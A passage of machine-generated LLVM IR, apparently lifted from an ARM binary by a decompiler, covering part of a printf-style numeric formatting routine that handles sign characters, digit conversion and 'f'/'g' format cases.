  store i32 %v5_11954, i32* %r2.global-to-local, align 4
  br label %.thread122

.thread122:                                       ; preds = %.thread121, %bb202
  br i1 %v3_11948, label %bb203, label %bb204

bb203:                                            ; preds = %.thread122
  %v4_11958 = load i32, i32* %sb.global-to-local, align 4
  %v5_11958 = add i32 %v4_11958, 1
  store i32 %v5_11958, i32* %r0.global-to-local, align 4
  br label %bb204

bb204:                                            ; preds = %.thread122, %bb203
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11960 = load i32, i32* %r7.global-to-local, align 4
  %v1_11960 = add i32 %v0_11960, -103
  %v3_11960 = sub i32 102, %v0_11960
  %v4_11960 = and i32 %v3_11960, %v0_11960
  %v5_11960 = icmp slt i32 %v4_11960, 0
  store i1 %v5_11960, i1* %cpsr_v.global-to-local, align 1
  %v6_11960 = icmp slt i32 %v1_11960, 0
  store i1 %v6_11960, i1* %cpsr_n.global-to-local, align 1
  %v7_11960 = icmp eq i32 %v0_11960, 103
  store i1 %v7_11960, i1* %cpsr_z.global-to-local, align 1
  %v3_11964 = add i32 %v2_11964, 1
  %v4_11964 = inttoptr i32 %v3_11964 to i8*
  store i8 0, i8* %v4_11964, align 1
  %v0_11968 = load i32, i32* %r1.global-to-local, align 4
  %v1_11968 = add i32 %v0_11968, 1
  store i32 %v1_11968, i32* %r1.global-to-local, align 4
  %v0_1196c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1196c, label %bb205, label %dec_label_pc_1199c

bb205:                                            ; preds = %bb204
  %v0_11970 = load i32, i32* %r0.global-to-local, align 4
  %v1_11970 = load i32, i32* %ip.global-to-local, align 4
  %not.v7_11974 = icmp sge i32 %v1_11970, %v0_11970
  %. = zext i1 %not.v7_11974 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v2_1197c = add i32 %v0_11970, 4
  %v4_1197c = sub i32 0, %v0_11970
  %v5_1197c = and i32 %v2_1197c, %v4_1197c
  %v6_1197c = icmp slt i32 %v5_1197c, 0
  store i1 %v6_1197c, i1* %cpsr_v.global-to-local, align 1
  %v7_1197c = icmp slt i32 %v2_1197c, 0
  store i1 %v7_1197c, i1* %cpsr_n.global-to-local, align 1
  %v8_1197c = icmp eq i32 %v2_1197c, 0
  store i1 %v8_1197c, i1* %cpsr_z.global-to-local, align 1
  %v5_11980 = icmp slt i32 %v0_11970, -4
  br i1 %v5_11980, label %.thread24, label %bb206

.thread24:                                        ; preds = %bb205
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread

bb206:                                            ; preds = %bb205
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_11984 = icmp eq i1 %not.v7_11974, false
  store i1 %v2_11984, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11984, label %.thread, label %bb207

.thread:                                          ; preds = %.thread24, %bb206
  %v1_1198829 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1198829, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_119a8

bb207:                                            ; preds = %bb206
  %v3_1198c = sub i32 %v1_11970, %v0_11970
  store i32 %v3_1198c, i32* %r8.global-to-local, align 4
  store i32 102, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_119b4

dec_label_pc_1199c:                               ; preds = %bb204
  %v0_1199c = load i32, i32* %r7.global-to-local, align 4
  %v1_1199c = add i32 %v0_1199c, -102
  %v3_1199c = sub i32 101, %v0_1199c
  %v4_1199c = and i32 %v3_1199c, %v0_1199c
  %v5_1199c = icmp slt i32 %v4_1199c, 0
  store i1 %v5_1199c, i1* %cpsr_v.global-to-local, align 1
  %v6_1199c = icmp slt i32 %v1_1199c, 0
  store i1 %v6_1199c, i1* %cpsr_n.global-to-local, align 1
  %v7_1199c = icmp eq i32 %v0_1199c, 102
  store i1 %v7_1199c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_1199c, i32* %sl.global-to-local, align 4
  br i1 %v7_1199c, label %dec_label_pc_1199c.dec_label_pc_119b4_crit_edge, label %dec_label_pc_119a8

dec_label_pc_1199c.dec_label_pc_119b4_crit_edge:  ; preds = %dec_label_pc_1199c
  %v0_119b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_119b4

dec_label_pc_119a8:                               ; preds = %.thread, %dec_label_pc_1199c
  store i32 0, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_119c4

dec_label_pc_119b4:                               ; preds = %bb207, %dec_label_pc_1199c.dec_label_pc_119b4_crit_edge
  %v0_119b4 = phi i32 [ %v0_119b4.pre, %dec_label_pc_1199c.dec_label_pc_119b4_crit_edge ], [ %v0_11970, %bb207 ]
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_119b4 = icmp slt i32 %v0_119b4, 0
  store i1 %v1_119b4, i1* %cpsr_n.global-to-local, align 1
  %v2_119b4 = icmp eq i32 %v0_119b4, 0
  store i1 %v2_119b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_119b4, label %bb208, label %bb209

bb208:                                            ; preds = %dec_label_pc_119b4
  store i32 48, i32* %r3.global-to-local, align 4
  %v5_119bc = load i32, i32* %r2.global-to-local, align 4
  %v6_119bc = add i32 %v5_119bc, -1
  %v7_119bc = inttoptr i32 %v6_119bc to i8*
  store i8 48, i8* %v7_119bc, align 1
  %v8_119bc = load i32, i32* %r2.global-to-local, align 4
  %v9_119bc = add i32 %v8_119bc, -1
  store i32 %v9_119bc, i32* %r2.global-to-local, align 4
  %v0_119c0.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_119f0.pre.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_119f4.pre.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_119f4.pre.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %bb209

bb209:                                            ; preds = %dec_label_pc_119b4, %bb208
  %v1_119f4.pre = phi i1 [ %v1_119f4.pre.pre, %bb208 ], [ false, %dec_label_pc_119b4 ]
  %v0_119f4.pre = phi i1 [ %v0_119f4.pre.pre, %bb208 ], [ false, %dec_label_pc_119b4 ]
  %v1_119f0.pre = phi i32 [ %v1_119f0.pre.pre, %bb208 ], [ %v1_11968, %dec_label_pc_119b4 ]
  %v0_119c0 = phi i32 [ %v0_119c0.pre, %bb208 ], [ %v0_119b4, %dec_label_pc_119b4 ]
  store i32 %v0_119c0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_119c4

dec_label_pc_119c4:                               ; preds = %dec_label_pc_119a8, %bb209
  %v0_11a94 = phi i32 [ 0, %dec_label_pc_119a8 ], [ %v0_119c0, %bb209 ]
  %v1_119f8 = phi i1 [ false, %dec_label_pc_119a8 ], [ %v1_119f4.pre, %bb209 ]
  %v0_119f8 = phi i1 [ false, %dec_label_pc_119a8 ], [ %v0_119f4.pre, %bb209 ]
  %v1_119f0 = phi i32 [ %v1_11968, %dec_label_pc_119a8 ], [ %v1_119f0.pre, %bb209 ]
  store i32 1, i32* %stack_var_-168, align 4
  store i32 176, i32* %r5.global-to-local, align 4
  %v2_119d0 = ptrtoint i32* %stack_var_-46 to i32
  store i32 %v2_119d0, i32* %r3.global-to-local, align 4
  %v0_119dc = load i32, i32* %r2.global-to-local, align 4
  %v1_119dc = inttoptr i32 %v0_119dc to i8*
  %v2_119dc = load i8, i8* %v1_119dc, align 1
  %v3_119dc = zext i8 %v2_119dc to i32
  store i32 %v3_119dc, i32* %r3.global-to-local, align 4
  %v5_119dc = add i32 %v0_119dc, 1
  store i32 %v5_119dc, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %v3_119dc, i32* %stack_var_-46, align 4
  %v2_119f0 = sub i32 %v1_119f0, %v5_119dc
  store i32 %v2_119f0, i32* %r1.global-to-local, align 4
  %v2_119f4 = xor i1 %v1_119f8, %v0_119f8
  br i1 %v2_119f4, label %.thread124, label %dec_label_pc_119fc

.thread124:                                       ; preds = %dec_label_pc_119c4
  %v5_119f4 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v5_119f4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11aa4

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119c4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_11a00 = sub i32 %v0_11a94, %v2_119f0
  %v4_11a00 = xor i32 %v2_119f0, %v0_11a94
  %v5_11a00 = xor i32 %v2_11a00, %v0_11a94
  %v6_11a00 = and i32 %v5_11a00, %v4_11a00
  %v7_11a00 = icmp slt i32 %v6_11a00, 0
  store i1 %v7_11a00, i1* %cpsr_v.global-to-local, align 1
  %v8_11a00 = icmp slt i32 %v2_11a00, 0
  store i1 %v8_11a00, i1* %cpsr_n.global-to-local, align 1
  %v9_11a00 = icmp eq i32 %v0_11a94, %v2_119f0
  store i1 %v9_11a00, i1* %cpsr_z.global-to-local, align 1
  store i32 112, i32* %stack_var_-160, align 4
  %v2_11a0c = xor i1 %v8_11a00, %v7_11a00
  br i1 %v2_11a0c, label %bb211, label %dec_label_pc_11a10

dec_label_pc_11a10:                               ; preds = %dec_label_pc_119fc
  store i32 %v2_11a00, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 %v8_11a00, i1* %cpsr_n.global-to-local, align 1
  %v2_11a14 = icmp eq i32 %v2_11a00, 0
  store i1 %v2_11a14, i1* %cpsr_z.global-to-local, align 1
  %tmp210 = icmp slt i32 %v2_11a00, 1
  br i1 %tmp210, label %.thread126, label %dec_label_pc_11a28

.thread126:                                       ; preds = %dec_label_pc_11a10
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11aa0

dec_label_pc_11a28:                               ; preds = %dec_label_pc_11a10
  store i32 ptrtoint (i32* @global_var_16f7f.533 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_11a34 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_11a34, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 176, i32* %stack_var_-148, align 4
  br label %dec_label_pc_11aa4

bb211:                                            ; preds = %dec_label_pc_119fc
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11a80 = icmp slt i32 %v0_11a94, 0
  store i1 %v1_11a80, i1* %cpsr_n.global-to-local, align 1
  %v2_11a80 = icmp eq i32 %v0_11a94, 0
  store i1 %v2_11a80, i1* %cpsr_z.global-to-local, align 1
  %tmp212 = icmp slt i32 %v0_11a94, 1
  br i1 %tmp212, label %dec_label_pc_11aa0, label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %bb211
  %v2_11a94 = sub i32 %v2_119f0, %v0_11a94
  store i32 %v2_11a94, i32* %r1.global-to-local, align 4
  %v2_11a98 = add i32 %v5_119dc, %v0_11a94
  store i32 %v2_11a98, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11a90, %.thread126, %bb211
  %storemerge138.in = phi i32* [ %stack_var_-160, %bb211 ], [ %stack_var_-148, %.thread126 ], [ %stack_var_-148, %dec_label_pc_11a90 ]
  %v0_11ab480 = phi i32 [ %v2_119f0, %bb211 ], [ 0, %.thread126 ], [ %v2_11a94, %dec_label_pc_11a90 ]
  %storemerge138 = ptrtoint i32* %storemerge138.in to i32
  store i32 %storemerge138, i32* %r6.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11aa4

dec_label_pc_11aa4:                               ; preds = %.thread124, %dec_label_pc_11a28, %dec_label_pc_11aa0
  %v1_11ad4 = phi i32 [ %v2_11a34, %dec_label_pc_11a28 ], [ %storemerge138, %dec_label_pc_11aa0 ], [ %v5_119f4, %.thread124 ]
  %v0_11aec88 = phi i32 [ -1, %dec_label_pc_11a28 ], [ -1, %dec_label_pc_11aa0 ], [ %v0_11a94, %.thread124 ]
  %v0_11ab4 = phi i32 [ 0, %dec_label_pc_11a28 ], [ %v0_11ab480, %dec_label_pc_11aa0 ], [ %v2_119f0, %.thread124 ]
  %v0_11aa4 = load i32, i32* %fp.global-to-local, align 4
  %v1_11aa4 = add i32 %v0_11aa4, 12
  %v2_11aa4 = inttoptr i32 %v1_11aa4 to i32*
  %v3_11aa4 = load i32, i32* %v2_11aa4, align 4
  %v1_11aa8 = and i32 %v3_11aa4, 16
  store i32 %v1_11aa8, i32* @lr, align 4
  %v2_11aa8 = icmp eq i32 %v1_11aa8, 0
  %tmp235 = zext i1 %v2_11aa8 to i32
  %.227 = xor i32 %tmp235, 1
  store i32 %.227, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11ab4 = icmp slt i32 %v0_11ab4, 0
  store i1 %v1_11ab4, i1* %cpsr_n.global-to-local, align 1
  %v2_11ab4 = icmp eq i32 %v0_11ab4, 0
  store i1 %v2_11ab4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11ab4, label %bb215, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_11aa4
  store i32 1, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_11ad0

bb215:                                            ; preds = %dec_label_pc_11aa4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  store i1 %v2_11aa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11aa8, label %dec_label_pc_11ac4, label %dec_label_pc_11ad0

dec_label_pc_11ac4:                               ; preds = %bb215
  %v0_11ac4 = load i32, i32* %r7.global-to-local, align 4
  %v1_11ac4 = add i32 %v0_11ac4, -103
  %v3_11ac4 = sub i32 102, %v0_11ac4
  %v4_11ac4 = and i32 %v3_11ac4, %v0_11ac4
  %v5_11ac4 = icmp slt i32 %v4_11ac4, 0
  store i1 %v5_11ac4, i1* %cpsr_v.global-to-local, align 1
  %v6_11ac4 = icmp slt i32 %v1_11ac4, 0
  store i1 %v6_11ac4, i1* %cpsr_n.global-to-local, align 1
  %v7_11ac4 = icmp eq i32 %v0_11ac4, 103
  store i1 %v7_11ac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11ac4, label %dec_label_pc_11aec, label %bb216

bb216:                                            ; preds = %dec_label_pc_11ac4
  %v1_11ac8 = load i32, i32* %r8.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_11ac8 = icmp slt i32 %v1_11ac8, 0
  store i1 %v2_11ac8, i1* %cpsr_n.global-to-local, align 1
  %v3_11ac8 = icmp eq i32 %v1_11ac8, 0
  store i1 %v3_11ac8, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v1_11ac8, 1
  br i1 %tmp217, label %dec_label_pc_11aec, label %dec_label_pc_11ad0

dec_label_pc_11ad0:                               ; preds = %.thread33, %bb215, %bb216
  %v2_11ad4 = inttoptr i32 %v1_11ad4 to i32*
  store i32 112, i32* %v2_11ad4, align 4
  %v1_11adc = load i32, i32* %r6.global-to-local, align 4
  %v2_11adc = add i32 %v1_11adc, 4
  %v3_11adc = inttoptr i32 %v2_11adc to i32*
  store i32 1, i32* %v3_11adc, align 4
  store i32 ptrtoint (i32* @global_var_16f8c.535 to i32), i32* %r3.global-to-local, align 4
  %v1_11ae4 = load i32, i32* %r6.global-to-local, align 4
  %v2_11ae4 = add i32 %v1_11ae4, 8
  %v3_11ae4 = inttoptr i32 %v2_11ae4 to i32*
  store i32 ptrtoint (i32* @global_var_16f8c.535 to i32), i32* %v3_11ae4, align 4
  %v0_11ae8 = load i32, i32* %r6.global-to-local, align 4
  %v1_11ae8 = add i32 %v0_11ae8, 12
  store i32 %v1_11ae8, i32* %r6.global-to-local, align 4
  %v0_11aec.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11aec

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11ac4, %bb216, %dec_label_pc_11ad0
  %v1_11af8 = phi i32 [ %v1_11ad4, %bb216 ], [ %v1_11ae8, %dec_label_pc_11ad0 ], [ %v1_11ad4, %dec_label_pc_11ac4 ]
  %v0_11aec = phi i32 [ %v0_11aec88, %bb216 ], [ %v0_11aec.pre, %dec_label_pc_11ad0 ], [ %v0_11aec88, %dec_label_pc_11ac4 ]
  %v1_11aec = add i32 %v0_11aec, 1
  store i32 %v1_11aec, i32* %ip.global-to-local, align 4
  %v3_11aec = sub i32 0, %v0_11aec
  %v4_11aec = and i32 %v1_11aec, %v3_11aec
  %v5_11aec = icmp slt i32 %v4_11aec, 0
  store i1 %v5_11aec, i1* %cpsr_v.global-to-local, align 1
  %v6_11aec = icmp slt i32 %v1_11aec, 0
  store i1 %v6_11aec, i1* %cpsr_n.global-to-local, align 1
  %v7_11aec = icmp eq i32 %v1_11aec, 0
  store i1 %v7_11aec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11aec, label %dec_label_pc_11b10, label %dec_label_pc_11af4

dec_label_pc_11af4:                               ; preds = %dec_label_pc_11aec
  %v1_11af4 = sub i32 -1, %v0_11aec
  %v2_11af8 = add i32 %v1_11af8, 4
  %v3_11af8 = inttoptr i32 %v2_11af8 to i32*
  store i32 %v1_11af4, i32* %v3_11af8, align 4
  store i32 ptrtoint (i32* @global_var_16f7f.533 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_11b04 = load i32, i32* %r6.global-to-local, align 4
  %v2_11b04 = inttoptr i32 %v1_11b04 to i32*
  store i32 176, i32* %v2_11b04, align 4
  %v0_11b08 = load i32, i32* %r3.global-to-local, align 4
  %v1_11b08 = load i32, i32* %r6.global-to-local, align 4
  %v2_11b08 = add i32 %v1_11b08, 8
  %v3_11b08 = inttoptr i32 %v2_11b08 to i32*
  store i32 %v0_11b08, i32* %v3_11b08, align 4
  %v0_11b0c = load i32, i32* %r6.global-to-local, align 4
  %v1_11b0c = add i32 %v0_11b0c, 12
  store i32 %v1_11b0c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11b10

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11aec, %dec_label_pc_11af4
  %v2_11b18 = phi i32 [ %v1_11af8, %dec_label_pc_11aec ], [ %v1_11b0c, %dec_label_pc_11af4 ]
  %v0_11b10 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11b10 = icmp slt i32 %v0_11b10, 0
  store i1 %v1_11b10, i1* %cpsr_n.global-to-local, align 1
  %v2_11b10 = icmp eq i32 %v0_11b10, 0
  store i1 %v2_11b10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11b10, label %.thread42, label %bb218

bb218:                                            ; preds = %dec_label_pc_11b10
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_11b18 = inttoptr i32 %v2_11b18 to i32*
  store i32 112, i32* %v3_11b18, align 4
  %v1_11b1c = load i32, i32* %r4.global-to-local, align 4
  %v2_11b1c = load i32, i32* %r6.global-to-local, align 4
  %v3_11b1c = add i32 %v2_11b1c, 8
  %v4_11b1c = inttoptr i32 %v3_11b1c to i32*
  store i32 %v1_11b1c, i32* %v4_11b1c, align 4
  %v1_11b20 = load i32, i32* %r1.global-to-local, align 4
  %v2_11b20 = load i32, i32* %r6.global-to-local, align 4
  %v3_11b20 = add i32 %v2_11b20, 4
  %v4_11b20 = inttoptr i32 %v3_11b20 to i32*
  store i32 %v1_11b20, i32* %v4_11b20, align 4
  %v1_11b24 = load i32, i32* %r6.global-to-local, align 4
  %v2_11b24 = add i32 %v1_11b24, 12
  store i32 %v2_11b24, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_11b10, %bb218
  %v1_11b48 = phi i32 [ %v2_11b18, %dec_label_pc_11b10 ], [ %v2_11b24, %bb218 ]
  %v0_11b28 = load i32, i32* %r7.global-to-local, align 4
  %v1_11b28 = add i32 %v0_11b28, -103
  %v3_11b28 = sub i32 102, %v0_11b28
  %v4_11b28 = and i32 %v3_11b28, %v0_11b28
  %v5_11b28 = icmp slt i32 %v4_11b28, 0
  store i1 %v5_11b28, i1* %cpsr_v.global-to-local, align 1
  %v6_11b28 = icmp slt i32 %v1_11b28, 0
  store i1 %v6_11b28, i1* %cpsr_n.global-to-local, align 1
  %v7_11b28 = icmp eq i32 %v0_11b28, 103
  store i1 %v7_11b28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b28, label %dec_label_pc_11b30, label %dec_label_pc_11b38

dec_label_pc_11b30:                               ; preds = %.thread42
  %v0_11b30 = load i32, i32* @lr, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11b30 = icmp slt i32 %v0_11b30, 0
  store i1 %v1_11b30, i1* %cpsr_n.global-to-local, align 1
  %v2_11b30 = icmp eq i32 %v0_11b30, 0
  store i1 %v2_11b30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11b30, label %dec_label_pc_11b60, label %dec_label_pc_11b38

dec_label_pc_11b38:                               ; preds = %.thread42, %dec_label_pc_11b30
  %v0_11b38 = load i32, i32* %ip.global-to-local, align 4
  %v1_11b38 = load i32, i32* %r1.global-to-local, align 4
  %v2_11b38 = sub i32 %v1_11b38, %v0_11b38
  store i32 %v2_11b38, i32* %r3.global-to-local, align 4
  %v1_11b3c = load i32, i32* %r8.global-to-local, align 4
  %v2_11b3c = sub i32 %v2_11b38, %v1_11b3c
  %v4_11b3c = xor i32 %v1_11b3c, %v2_11b38
  %v5_11b3c = xor i32 %v2_11b3c, %v2_11b38
  %v6_11b3c = and i32 %v5_11b3c, %v4_11b3c
  %v7_11b3c = icmp slt i32 %v6_11b3c, 0
  store i1 %v7_11b3c, i1* %cpsr_v.global-to-local, align 1
  %v8_11b3c = icmp slt i32 %v2_11b3c, 0
  store i1 %v8_11b3c, i1* %cpsr_n.global-to-local, align 1
  %v9_11b3c = icmp eq i32 %v2_11b38, %v1_11b3c
  store i1 %v9_11b3c, i1* %cpsr_z.global-to-local, align 1
  %v2_11b40 = xor i1 %v8_11b3c, %v7_11b3c
  br i1 %v2_11b40, label %dec_label_pc_11b44, label %dec_label_pc_11b60

dec_label_pc_11b44:                               ; preds = %dec_label_pc_11b38
  %v2_11b44 = sub i32 %v1_11b3c, %v2_11b38
  %v2_11b48 = add i32 %v1_11b48, 4
  %v3_11b48 = inttoptr i32 %v2_11b48 to i32*
  store i32 %v2_11b44, i32* %v3_11b48, align 4
  store i32 ptrtoint (i32* @global_var_16f7f.533 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_11b54 = load i32, i32* %r6.global-to-local, align 4
  %v2_11b54 = inttoptr i32 %v1_11b54 to i32*
  store i32 176, i32* %v2_11b54, align 4
  %v0_11b58 = load i32, i32* %r3.global-to-local, align 4
  %v1_11b58 = load i32, i32* %r6.global-to-local, align 4
  %v2_11b58 = add i32 %v1_11b58, 8
  %v3_11b58 = inttoptr i32 %v2_11b58 to i32*
  store i32 %v0_11b58, i32* %v3_11b58, align 4
  %v0_11b5c = load i32, i32* %r6.global-to-local, align 4
  %v1_11b5c = add i32 %v0_11b5c, 12
  store i32 %v1_11b5c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11b60

dec_label_pc_11b60:                               ; preds = %dec_label_pc_11b38, %dec_label_pc_11b30, %dec_label_pc_11b44
  %v1_11bf4.pre.pre = phi i32 [ %v1_11b48, %dec_label_pc_11b38 ], [ %v1_11b48, %dec_label_pc_11b30 ], [ %v1_11b5c, %dec_label_pc_11b44 ]
  %v0_11b60 = load i32, i32* %sl.global-to-local, align 4
  %v1_11b60 = add i32 %v0_11b60, -102
  %v3_11b60 = sub i32 101, %v0_11b60
  %v4_11b60 = and i32 %v3_11b60, %v0_11b60
  %v5_11b60 = icmp slt i32 %v4_11b60, 0
  store i1 %v5_11b60, i1* %cpsr_v.global-to-local, align 1
  %v6_11b60 = icmp slt i32 %v1_11b60, 0
  store i1 %v6_11b60, i1* %cpsr_n.global-to-local, align 1
  %v7_11b60 = icmp eq i32 %v0_11b60, 102
  store i1 %v7_11b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11b60, label %dec_label_pc_11be8, label %dec_label_pc_11b68

dec_label_pc_11b68:                               ; preds = %dec_label_pc_11b60
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_11b6c = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11b6c = icmp slt i32 %v0_11b6c, 0
  store i1 %v1_11b6c, i1* %cpsr_n.global-to-local, align 1
  %v2_11b6c = icmp eq i32 %v0_11b6c, 0
  store i1 %v2_11b6c, i1* %cpsr_z.global-to-local, align 1
  %v4_11b70 = zext i8 %stack_var_-66.0105111 to i32
  store i32 %v4_11b70, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_11b80 = sub i32 0, %v0_11b6c
  %storemerge137 = select i1 %v1_11b6c, i32 %v4_11b80, i32 %v0_11b6c
  %tmp236 = ashr i32 %v0_11b6c, 31
  %tmp237 = and i32 %tmp236, 2
  %tmp238 = add nuw nsw i32 %tmp237, 43
  store i32 %storemerge137, i32* %r4.global-to-local, align 4
  store i32 %tmp238, i32* %sl.global-to-local, align 4
  %v2_11b88 = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_11b88, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11b90

dec_label_pc_11b90:                               ; preds = %dec_label_pc_11bc0, %dec_label_pc_11b90, %dec_label_pc_11b68
  %v0_11b90 = phi i32 [ %storemerge137, %dec_label_pc_11b68 ], [ %v0_11bac, %dec_label_pc_11b90 ], [ %v0_11bac, %dec_label_pc_11bc0 ]
  store i32 %v0_11b90, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_11b98 = call i32 @function_c930(i32 %v0_11b90, i32 10)
  %v1_11b9c = add i32 %v2_11b98, 48
  store i32 %v1_11b9c, i32* %r3.global-to-local, align 4
  store i32 10, i32* @r1, align 4
  %v0_11ba4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11ba4, i32* @r0, align 4
  %v1_11ba8 = trunc i32 %v1_11b9c to i8
  %v2_11ba8 = load i32, i32* %r5.global-to-local, align 4
  %v3_11ba8 = add i32 %v2_11ba8, -1
  %v4_11ba8 = inttoptr i32 %v3_11ba8 to i8*
  store i8 %v1_11ba8, i8* %v4_11ba8, align 1
  %v5_11ba8 = load i32, i32* %r5.global-to-local, align 4
  %v6_11ba8 = add i32 %v5_11ba8, -1
  store i32 %v6_11ba8, i32* %r5.global-to-local, align 4
  %v0_11bac = call i32 @function_149b4()
  store i32 %v0_11bac, i32* %r0.global-to-local, align 4
  %v0_11bb0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11bb0 = add i32 %v0_11bb0, 1
  store i32 %v1_11bb0, i32* %r7.global-to-local, align 4
  %v1_11bb4 = add i32 %v0_11bb0, -2
  %v3_11bb4 = sub i32 1, %v0_11bb0
  %v4_11bb4 = and i32 %v3_11bb4, %v1_11bb0
  %v5_11bb4 = icmp slt i32 %v4_11bb4, 0
  store i1 %v5_11bb4, i1* %cpsr_v.global-to-local, align 1
  %v6_11bb4 = icmp slt i32 %v1_11bb4, 0
  store i1 %v6_11bb4, i1* %cpsr_n.global-to-local, align 1
  %v7_11bb4 = icmp eq i32 %v1_11bb0, 3
  store i1 %v7_11bb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_11bac, i32* %r4.global-to-local, align 4
  %v7_11bbc = icmp slt i32 %v1_11bb0, 4
  br i1 %v7_11bbc, label %dec_label_pc_11b90, label %dec_label_pc_11bc0

dec_label_pc_11bc0:                               ; preds = %dec_label_pc_11b90
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_11bc0 = icmp slt i32 %v0_11bac, 0
  store i1 %v1_11bc0, i1* %cpsr_n.global-to-local, align 1
  %v2_11bc0 = icmp eq i32 %v0_11bac, 0
  store i1 %v2_11bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11bc0, label %dec_label_pc_11bc8, label %dec_label_pc_11b90

dec_label_pc_11bc8:                               ; preds = %dec_label_pc_11bc0
  %v0_11bc8 = load i32, i32* %r5.global-to-local, align 4
  %v1_11bc8 = add i32 %v0_11bc8, -1
  store i32 %v1_11bc8, i32* %r3.global-to-local, align 4
  %v0_11bcc = load i32, i32* %sl.global-to-local, align 4
  %v1_11bcc = trunc i32 %v0_11bcc to i8
  %v4_11bcc = inttoptr i32 %v1_11bc8 to i8*
  store i8 %v1_11bcc, i8* %v4_11bcc, align 1
  %v0_11bd0 = load i32, i32* %r3.global-to-local, align 4
  %v1_11bd0 = add i32 %v0_11bd0, -1
  store i32 %v1_11bd0, i32* %r2.global-to-local, align 4
  %v0_11bd4 = load i32, i32* %r8.global-to-local, align 4
  %v1_11bd4 = trunc i32 %v0_11bd4 to i8
  %v4_11bd4 = inttoptr i32 %v1_11bd0 to i8*
  store i8 %v1_11bd4, i8* %v4_11bd4, align 1
  store i32 112, i32* %r3.global-to-local, align 4
